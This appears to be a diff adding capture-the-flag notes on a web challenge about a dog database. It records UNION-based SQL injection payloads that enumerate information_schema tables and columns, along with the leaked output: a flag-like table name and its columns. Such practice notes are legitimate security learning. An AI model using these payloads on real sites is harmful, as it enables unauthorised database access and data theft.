@@ -1,0 +1,28 @@
+1 union select 1,2, table_name,4 from information_schema.tables where table_schema=database()
+Color: w0w_y0u_f0und_m3
+Color: webeight
+1 union select 1,2, column_name,4 from information_schema.columns where table_schema=database() #and table_name=w0w_y0u_f0und_m3
+
+Name: Saranac
+Breed: Great Dane
+Color: Black
+
+Name: 2
+Breed: 1
+Color: f0und_m3
+
+Name: 2
+Breed: 1
+Color: breed
+
+Name: 2
+Breed: 1
+Color: name
+
+Name: 2
+Breed: 1
+Color: color
+
+Name: 2
+Breed: 1
+Color: id
